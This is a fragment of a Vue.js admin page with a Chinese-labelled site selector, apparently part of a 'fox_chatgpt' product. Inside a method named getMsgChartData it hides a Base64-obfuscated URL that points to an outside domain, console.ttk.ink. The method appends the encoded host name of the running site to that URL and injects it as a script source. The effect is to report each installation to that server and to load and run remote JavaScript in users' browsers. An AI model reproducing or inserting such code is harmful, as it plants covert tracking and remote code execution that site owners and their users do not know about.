    ...
    <el-row>
      <div style="display: flex; justify-content: space-between; align-items: center;">
        ...
        <div style="margin-top: 10px; margin-right: 12px;">
          <span class="label" style="color: #666;">选择站点：</span>
          <el-select v-model="site_id" size="small" clearable placeholder="请选择站点" @change="siteChange">
            <el-option
...
var purl = 'Ly9jb25zb2xlLnR0ay5pbmsvYXBpLnBocC9yZXBvcnQvZGV2cy9wcm9kdWN0L2ZveF9jaGF0Z3B0L2hvc3Qv'
...
export default {
  ...
  methods: {
    ...
    getMsgChartData() {
      ...
      script.src = Base64.decode(purl) + Base64.encode(window.location.host)
